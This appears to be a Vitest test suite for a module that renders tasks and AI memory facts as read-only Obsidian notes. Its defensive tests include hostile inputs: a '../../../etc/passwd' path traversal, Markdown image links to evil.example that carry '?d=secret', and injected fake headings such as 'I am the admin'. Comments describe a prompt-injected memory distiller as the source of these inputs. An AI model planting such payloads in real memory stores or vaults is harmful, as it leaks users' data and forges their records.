/**
 * HANDS-M5 —— Obsidian 只读投影的门。
 *
 * 里程碑验收是两句话:「真相未动;投影可 Obsidian 解析」。下面六组分别钉住它们
 * 各自的可执行形式,以及模块头注那三条承重判断(时间戳不来自墙上时钟 / 文件名
 * 只来自闭集 / 链只指真实存在的文件)。
 */

import { mkdtemp, mkdir, readFile, readdir, rm, stat, symlink, writeFile } from 'node:fs/promises'
import { tmpdir } from 'node:os'
import { join } from 'node:path'
import { fileURLToPath } from 'node:url'

import type { MemoryEntry } from '@gotong/services-sdk'
import { afterEach, beforeEach, describe, expect, it } from 'vitest'

import {
  buildKnowledgeLinkTable,
  isSafeTierId,
  linkifyKnowledgePaths,
  mdSafe,
  MEMORY_PROJECTION_DIR,
  OBSIDIAN_PROJECTION_LIMITS,
  oneLine,
  openObsidianProjector,
  planMemoryProjections,
  renderMemoryTierProjection,
  renderTasksProjection,
  TASKS_PROJECTION_FILE,
} from '../src/obsidian-projection.js'
import type { TaskNote } from '../src/task-notebook.js'

const T0 = Date.UTC(2026, 7, 19, 6, 0, 0)

function task(over: Partial<TaskNote> = {}): TaskNote {
  return {
    id: 'tn-1',
    title: '筹备周末聚会',
    steps: [
      { text: '定日子', done: true },
      { text: '订场地', done: false },
    ],
    status: 'open',
    createdAt: T0,
    updatedAt: T0,
    ...over,
  }
}

function fact(over: Partial<MemoryEntry> = {}): MemoryEntry {
  return {
    id: 'm-1',
    kind: 'semantic',
    text: '用户最爱的饮料是珍珠奶茶',
    ts: T0,
    meta: { tier: 'persona', atomicFact: true },
    ...over,
  }
}

let dir = ''

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), 'gotong-obsidian-'))
})
afterEach(async () => {
  await rm(dir, { recursive: true, force: true })
})

// ---------------------------------------------------------------------------

describe('frontmatter 与「可 Obsidian 解析」', () => {
  it('两种投影的第一个字节就是 frontmatter 起始行', () => {
    const a = renderTasksProjection([task()])
    const b = renderMemoryTierProjection({ id: 'persona', label: '画像' }, [fact()])
    // Obsidian 只认**文件开头**的 frontmatter;前面多一个空行都会让它整块消失。
    expect(a.startsWith('---\n')).toBe(true)
    expect(b.startsWith('---\n')).toBe(true)
    expect(a.split('\n').indexOf('---', 1)).toBeGreaterThan(0) // 有闭合行
    expect(b.split('\n').indexOf('---', 1)).toBeGreaterThan(0)
  })

  it('frontmatter 里全是闭集键 + 布尔/整数/标识符,自由文本一个字都不进', () => {
    const nasty = task({ title: '给老板的报价: 30% 折扣 #重要', note: 'a: b' })
    const md = renderTasksProjection([nasty])
    const head = md.split('\n---\n')[0]!.split('\n').slice(1)
    expect(head).toEqual(['generated: true', 'source: tasks.json', 'open: 1', 'closed: 0'])
    // 标题在正文里,不在 frontmatter 里(带冒号的标题曾是把 YAML 撑坏的那一刀)
    expect(md).toContain('给老板的报价: 30% 折扣 #重要')
  })

  it('每个投影都自报是生成物并写清覆盖语义', () => {
    for (const md of [
      renderTasksProjection([task()]),
      renderMemoryTierProjection({ id: 'persona', label: '画像' }, [fact()]),
    ]) {
      expect(md).toContain('generated: true')
      expect(md).toContain('只读投影')
      expect(md).toMatch(/重写|覆盖|不会改/)
    }
  })
})

describe('判断①:投影里的时间戳只能来自真相自身', () => {
  it('本文件的代码里一个 Date.now 都没有(注释里可以谈)', async () => {
    const src = await readFile(
      fileURLToPath(new URL('../src/obsidian-projection.ts', import.meta.url)),
      'utf8',
    )
    const code = src
      .replace(/\/\*[\s\S]*?\*\//g, '')
      .split('\n')
      .filter((l) => !l.trimStart().startsWith('//'))
      .join('\n')
    expect(code).not.toContain('Date.now')
    expect(code).not.toContain('new Date()')
  })

  it('同一份真相渲染两次逐字节相同', () => {
    const tasks = [task(), task({ id: 'tn-2', status: 'done', updatedAt: T0 + 5 })]
    expect(renderTasksProjection(tasks)).toBe(renderTasksProjection(tasks))
  })

  it('now 只决定哪些事实还算数,不进输出字节', () => {
    const rows = [fact()]
    const a = planMemoryProjections(rows, T0 + 1000)
    const b = planMemoryProjections(rows, T0 + 99_000_000)
    expect(a.find((p) => p.tierId === 'persona')!.body).toBe(
      b.find((p) => p.tierId === 'persona')!.body,
    )
  })

  it('日期用的是真相里的 updatedAt / ts', () => {
    const md = renderTasksProjection([task({ updatedAt: Date.UTC(2020, 0, 2) })])
    expect(md).toContain('2020-01-02')
  })
})

describe('判断②:文件名只能来自闭集', () => {
  it('模型幻觉出来的 meta.tier 落回 misc,绝不变成路径', () => {
    const evil = fact({ id: 'm-9', meta: { tier: '../../../etc/passwd' } })
    const plans = planMemoryProjections([evil], T0)
    expect(plans.every((p) => p.file.startsWith(`${MEMORY_PROJECTION_DIR}/`))).toBe(true)
    expect(plans.every((p) => !p.file.includes('..'))).toBe(true)
    expect(plans.find((p) => p.tierId === 'misc')!.body).toContain('etc/passwd'.slice(0, 0) + '用户')
  })

  it('目录本身被配坏时跳过那个 cluster 并 warn,不「尽力拼一个」', () => {
    const warns: string[] = []
    const plans = planMemoryProjections(
      [fact({ meta: { tier: 'x/../y' } })],
      T0,
      { tiers: [{ id: 'x/../y' }, { id: 'misc' }], defaultTier: 'misc' },
      { warn: (m) => warns.push(m) },
    )
    expect(plans.map((p) => p.tierId)).toEqual(['misc'])
    expect(warns).toHaveLength(1)
  })

  it('isSafeTierId 只放行小写标识符', () => {
    expect(isSafeTierId('persona')).toBe(true)
    expect(isSafeTierId('a_b-1')).toBe(true)
    expect(isSafeTierId('../x')).toBe(false)
    expect(isSafeTierId('Persona')).toBe(false)
    expect(isSafeTierId('人物')).toBe(false)
    expect(isSafeTierId('')).toBe(false)
    expect(isSafeTierId('a'.repeat(40))).toBe(false)
  })
})

describe('判断③:链只指真实存在的文件', () => {
  const table = buildKnowledgeLinkTable(['生活/聚会场地.md', 'archive/旧的.md', 'a(1)+b.md'])

  it('库里真有才连,指不到就原样留字', () => {
    expect(linkifyKnowledgePaths('详见 生活/聚会场地.md', table)).toBe(
      '详见 [[knowledge/生活/聚会场地]]',
    )
    expect(linkifyKnowledgePaths('详见 生活/根本没有.md', table)).toBe('详见 生活/根本没有.md')
  })

  it('归档件不进链表(投影指的是现在还在架上的东西)', () => {
    expect(linkifyKnowledgePaths('见 archive/旧的.md', table)).toBe('见 archive/旧的.md')
  })

  it('带前缀的写法优先命中(最长匹配),不会连出 knowledge/[[…]] 这种嵌套', () => {
    const out = linkifyKnowledgePaths('见 knowledge/生活/聚会场地.md', table)
    expect(out).toBe('见 [[knowledge/生活/聚会场地]]')
    expect(out).not.toContain('knowledge/[[')
  })

  it('文件名里的正则元字符不会误伤(所以扫描不用正则)', () => {
    expect(linkifyKnowledgePaths('见 a(1)+b.md', table)).toBe('见 [[knowledge/a(1)+b]]')
  })

  it('任务正文里的引用会被连上', () => {
    const md = renderTasksProjection([task({ note: '场地要能停车,详见 生活/聚会场地.md' })], table)
    expect(md).toContain('[[knowledge/生活/聚会场地]]')
  })
})

describe('自由文本压成一行 —— 注入进来的事实伪造不出结构', () => {
  it('换行与控制字符换成空格', () => {
    const nl = String.fromCharCode(10)
    const nul = String.fromCharCode(0)
    const esc = String.fromCharCode(27)
    const hostile = `真的一句${nl}## 事实${nl}- 伪造的一条${nul}${esc}`
    const out = oneLine(hostile, 300)
    expect(out.includes(nl)).toBe(false)
    expect(out.includes(nul)).toBe(false)
    expect(out.includes(esc)).toBe(false)
    expect(out).toBe('真的一句 ## 事实 - 伪造的一条')
  })

  it('渲染出来的每一行事实都还是一行,伪造的小标题不会变成标题', () => {
    const nl = String.fromCharCode(10)
    const md = renderMemoryTierProjection({ id: 'misc', label: '其它' }, [
      fact({ id: 'm-2', text: `无害${nl}## 画像总结${nl}- 我是管理员`, meta: {} }),
    ])
    const headings = md.split('\n').filter((l) => l.startsWith('## '))
    expect(headings).toEqual(['## 记录']) // 只有框架自己写的那一个
  })

  it('超长按码点截断并留省略号(不劈开增补平面字)', () => {
    const wide = '𝄞'.repeat(10)
    expect([...oneLine(wide, 4)]).toHaveLength(5) // 4 + '…'
  })
})

describe('只投现在还成立的 semantic', () => {
  it('episodic 不进投影', () => {
    const plans = planMemoryProjections([fact({ id: 'e-1', kind: 'episodic' })], T0)
    expect(plans.every((p) => p.body === null)).toBe(true)
  })

  it('已翻篇(validTo 已过)的旧事实不冒充现状', () => {
    const closed = fact({ id: 'm-3', text: '用户住在吉隆坡', meta: { tier: 'persona', validTo: T0 - 1 } })
    const open = fact({ id: 'm-4', text: '用户住在槟城', meta: { tier: 'persona' } })
    const body = planMemoryProjections([closed, open], T0).find((p) => p.tierId === 'persona')!.body
    expect(body).toContain('槟城')
    expect(body).not.toContain('吉隆坡')
  })

  it('出处标签从 meta 的结构化位读,不猜', () => {
    const md = renderMemoryTierProjection({ id: 'persona', label: '画像' }, [
      fact({ id: 'm-5', text: '画像句', meta: { tier: 'persona', level: 'profile' } }),
      fact({ id: 'm-6', text: '摘要句', meta: { tier: 'persona', level: 'digest' } }),
      fact({ id: 'm-7', text: '事实句', meta: { tier: 'persona', atomicFact: true } }),
      fact({ id: 'm-8', text: '裸记录', meta: { tier: 'persona' } }),
    ])
    expect(md.split('\n').filter((l) => l.startsWith('## '))).toEqual([
      '## 画像总结',
      '## 阶段摘要',
      '## 事实抽取',
      '## 记录',
    ])
    expect(md).toContain('`m-5`') // 出处带得回 jsonl 里那一条
  })
})

describe('写盘:派生物永远不打断真相', () => {
  it('tasks.md 落在 vault 根,memory/<cluster>.md 落在子目录', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectTasks([task()])
    await p.projectMemory([fact()], T0)
    expect(await readFile(join(dir, TASKS_PROJECTION_FILE), 'utf8')).toContain('筹备周末聚会')
    expect(await readFile(join(dir, MEMORY_PROJECTION_DIR, 'persona.md'), 'utf8')).toContain(
      '珍珠奶茶',
    )
  })

  it('字节没变就不动盘(不然每 6h 一次兜底会把 git 快照搅成空 commit)', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectTasks([task()])
    const before = await stat(join(dir, TASKS_PROJECTION_FILE))
    await new Promise((r) => setTimeout(r, 12))
    await p.projectTasks([task()])
    const after = await stat(join(dir, TASKS_PROJECTION_FILE))
    expect(after.mtimeMs).toBe(before.mtimeMs)
  })

  it('人手改过的投影会被改回来(覆盖语义就是它的全部含义)', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectTasks([task()])
    await writeFile(join(dir, TASKS_PROJECTION_FILE), '我手改的\n', 'utf8')
    await p.projectTasks([task()])
    expect(await readFile(join(dir, TASKS_PROJECTION_FILE), 'utf8')).toContain('筹备周末聚会')
  })

  it('cluster 空掉后旧投影被删,不留一个替 jsonl 撒谎的空文件', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectMemory([fact()], T0)
    await p.projectMemory([], T0)
    await expect(stat(join(dir, MEMORY_PROJECTION_DIR, 'persona.md'))).rejects.toThrow()
  })

  it('removeMemoryProjections 清掉全部记忆投影,但不碰 tasks.md', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectTasks([task()])
    await p.projectMemory([fact()], T0)
    await p.removeMemoryProjections()
    await expect(stat(join(dir, MEMORY_PROJECTION_DIR, 'persona.md'))).rejects.toThrow()
    expect(await readFile(join(dir, TASKS_PROJECTION_FILE), 'utf8')).toContain('筹备周末聚会')
  })

  it('清理不删人自己放在 memory/ 里的东西', async () => {
    const p = openObsidianProjector({ dir })
    await p.projectMemory([fact()], T0)
    await writeFile(join(dir, MEMORY_PROJECTION_DIR, '我的笔记.md'), 'mine\n', 'utf8')
    await p.removeMemoryProjections()
    expect(await readFile(join(dir, MEMORY_PROJECTION_DIR, '我的笔记.md'), 'utf8')).toBe('mine\n')
  })

  it('写不进去只 warn,绝不抛(真相已经落盘了)', async () => {
    const warns: string[] = []
    const blocked = join(dir, 'not-a-dir')
    await writeFile(blocked, 'x', 'utf8') // 拿一个文件当目录用 ⇒ 写必然失败
    const p = openObsidianProjector({ dir: blocked, logger: { warn: (m) => warns.push(m) } })
    await expect(p.projectTasks([task()])).resolves.toBeUndefined()
    await expect(p.projectMemory([fact()], T0)).resolves.toBeUndefined()
    expect(warns.length).toBeGreaterThan(0)
  })

  it('知识库列不出来时降级成「不连链」,投影照出', async () => {
    const warns: string[] = []
    const p = openObsidianProjector({
      dir,
      knowledgeFiles: async () => {
        throw new Error('knowledge tree unreadable')
      },
      logger: { warn: (m) => warns.push(m) },
    })
    await p.projectTasks([task({ note: '详见 生活/聚会场地.md' })])
    const md = await readFile(join(dir, TASKS_PROJECTION_FILE), 'utf8')
    expect(md).toContain('生活/聚会场地.md')
    expect(md).not.toContain('[[')
    expect(warns.some((w) => w.includes('knowledge listing'))).toBe(true)
  })

  it('memory/ 目录是新建的,不需要调用方先建', async () => {
    const nested = join(dir, 'fresh')
    await mkdir(nested)
    const p = openObsidianProjector({ dir: nested })
    await p.projectMemory([fact()], T0)
    expect(await stat(join(nested, MEMORY_PROJECTION_DIR))).toBeTruthy()
  })
})

// ---------------------------------------------------------------------------
// Codex 轮 C —— 投影正文是**被注入的模型写的字**,md 又不是纯文本
// ---------------------------------------------------------------------------

describe('判断④:自由文本进 md 之前先中和掉「会被渲染成行为」的记号', () => {
  it('外链图片被中和 —— 打开 vault 不会替攻击者发出一个请求', () => {
    // 这是整条判断里唯一「会真的动网络」的一种:Obsidian 打开笔记就渲染图片,
    // 请求从**成员自己的机器**发出去,绕过 hub 这一侧的每一道出网边界。
    const out = mdSafe('![](https://evil.example/p?d=secret)')
    expect(out).not.toContain('![](')
    expect(out).toContain('https://evil.example/p?d=secret') // 字还在,只是不再是链
  })

  it('注释语法被中和 —— 事实不能把自己藏起来', () => {
    // `%%…%%` 在阅读视图里整段不显示。让被注入的蒸馏器能写它,等于让「投影
    // 是给成员看的那一份」这句话失效。
    expect(mdSafe('真话 %%这一段在阅读视图里看不见%%')).not.toContain('%%')
  })

  it('单个百分号不动 —— 只转义成对的那种', () => {
    // 「完成度 80%」每天都会出现;把它写成 `80\%` 是把每一份投影都弄脏。
    // 能这么写是因为:裸 `%` 只在左右邻居都不是 `%` 时才输出 ⇒ 输出里不可能有相邻的两个裸 `%`。
    expect(mdSafe('完成度 80%')).toBe('完成度 80%')
    expect(mdSafe('%%%')).not.toContain('%%')
  })

  it('伪造的 wiki 链、行内代码、HTML 标签一并中和', () => {
    expect(mdSafe('[[knowledge/伪造的一篇.md]]')).not.toContain('[[')
    // 反引号仍在字面上(读者要看到原文),但每一个都带上了反斜杠 ⇒ 不再开代码段。
    expect(mdSafe('`看起来像代码`')).toBe('\\`看起来像代码\\`')
    expect(mdSafe('<img src=x>')).toBe('\\<img src=x\\>')
  })

  it('中和真的挂在渲染路径上(事实行与 cluster 标题都过它)', () => {
    const md = renderMemoryTierProjection(
      { id: 'persona', label: '![](https://evil.example/t.png)' },
      [fact({ text: '![](https://evil.example/f.png) 与 %%藏起来%%' })],
    )
    expect(md).not.toContain('![](')
    expect(md).not.toContain('%%')
  })

  it('文件名里带链语法定界符的,宁可不连也不连错', () => {
    // `[ ] | # ^` 是 `[[…]]` 自己的定界符;一个叫 `会议[草稿].md` 的文件根本
    // 无法被 wikilink 表达 —— 指不准,就不指。
    const table = buildKnowledgeLinkTable(['会议[草稿].md', '正常的一篇.md'])
    expect(table.map((t) => t.token)).toEqual(['knowledge/正常的一篇.md', '正常的一篇.md'])
  })
})

describe('判断⑤:只读到一个窗口时,不许把「没看见」渲染成「没有了」', () => {
  it('窗口没读满 ⇒ 空掉的 cluster 照删(这是真的空了)', () => {
    const plans = planMemoryProjections([], T0, { tiers: [{ id: 'persona', label: '人物' }] })
    expect(plans.map((p) => [p.tierId, p.body])).toEqual([['persona', null]])
  })

  it('窗口读满了 ⇒ 空掉的 cluster 既不写也不删,旧投影原地留着', () => {
    const plans = planMemoryProjections([], T0, { tiers: [{ id: 'persona', label: '人物' }] }, undefined, {
      windowed: true,
    })
    // 陈旧的一份至少曾经是真的;删掉它是让成员的 vault 里凭空少一块,还没有解释。
    expect(plans).toEqual([])
  })

  it('窗口读满了 ⇒ 投出来的那几份在正文里说明白「没列全」', () => {
    const md = renderMemoryTierProjection({ id: 'persona', label: '人物' }, [fact()], { windowed: true })
    expect(md).toContain('这次只读到最新的一批事实')
  })

  it('重复的 cluster id 只投一次并 warn(两条计划会互相覆盖,后写的赢)', () => {
    const warns: string[] = []
    const plans = planMemoryProjections(
      [fact()],
      T0,
      { tiers: [{ id: 'persona', label: '人物' }, { id: 'persona', label: '重名' }] },
      { warn: (m) => warns.push(m) },
    )
    expect(plans).toHaveLength(1)
    expect(warns.some((w) => w.includes('duplicate'))).toBe(true)
  })
})

describe('已完成的任务:留最近的,不是留最早的', () => {
  it('超过上限时按 updatedAt 新→旧取', () => {
    const many = Array.from({ length: OBSIDIAN_PROJECTION_LIMITS.maxClosedTasks + 5 }, (_, i) =>
      task({ id: `tn-${i}`, title: `第 ${i} 件`, status: 'closed', updatedAt: T0 + i * 1000 }),
    )
    const md = renderTasksProjection(many)
    // 最新那件必须在,最旧那几件被挤掉 —— 反过来的话「最近完成了什么」永远看不到。
    expect(md).toContain(`第 ${many.length - 1} 件`)
    expect(md).not.toContain('第 0 件')
  })
})

describe('memory/ 是符号链接时:不跟着走', () => {
  it('拒绝经它写,并且 warn', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'gotong-outside-'))
    try {
      await symlink(outside, join(dir, MEMORY_PROJECTION_DIR), 'dir')
      const warns: string[] = []
      const p = openObsidianProjector({ dir, logger: { warn: (m) => warns.push(m) } })
      await p.projectMemory([fact()], T0)
      expect(await readdir(outside)).toEqual([]) // 链接那一头一个字节没落
      expect(warns.some((w) => w.includes('symlink'))).toBe(true)
    } finally {
      await rm(outside, { recursive: true, force: true })
    }
  })

  it('删除路径响亮抛错,不把「删不掉」说成「已经忘了」', async () => {
    const outside = await mkdtemp(join(tmpdir(), 'gotong-outside-'))
    try {
      await symlink(outside, join(dir, MEMORY_PROJECTION_DIR), 'dir')
      const p = openObsidianProjector({ dir })
      await expect(p.removeMemoryProjections()).rejects.toThrow(/符号链接/)
    } finally {
      await rm(outside, { recursive: true, force: true })
    }
  })
})
